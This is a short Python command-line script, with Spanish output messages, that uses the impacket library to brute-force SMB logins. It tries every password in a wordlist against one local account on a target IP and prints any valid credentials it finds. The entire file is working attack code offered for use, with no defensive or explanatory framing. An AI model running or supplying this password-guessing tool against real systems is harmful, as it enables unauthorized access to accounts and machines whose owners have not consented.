#!/usr/bin/env python3

import argparse
from impacket.smbconnection import SMBConnection
import sys

def brute_force_smb(ip, user, wordlist_path):
    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            for password in f:
                password = password.strip()
                try:
                    conn = SMBConnection(ip, ip, timeout=3)
                    conn.login(user, password)
                    print(f"[+] ¡Credenciales válidas encontradas! => {user}:{password}")
                    return
                except Exception:
                    print(f"[-] Falló => {user}:{password}")
    except FileNotFoundError:
        print(f"[!] No se pudo abrir el diccionario: {wordlist_path}")
        sys.exit(1)

    print("[!] No se encontró ninguna contraseña válida.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Fuerza bruta SMB para cuentas locales.')
    parser.add_argument("ip", help="IP del objetivo")
    parser.add_argument("-u", "--user", required=True, help="Usuario local a probar")
    parser.add_argument("-w", "--wordlist", required=True, help="Ruta absoluta del diccionario")

    args = parser.parse_args()
    brute_force_smb(args.ip, args.user, args.wordlist)
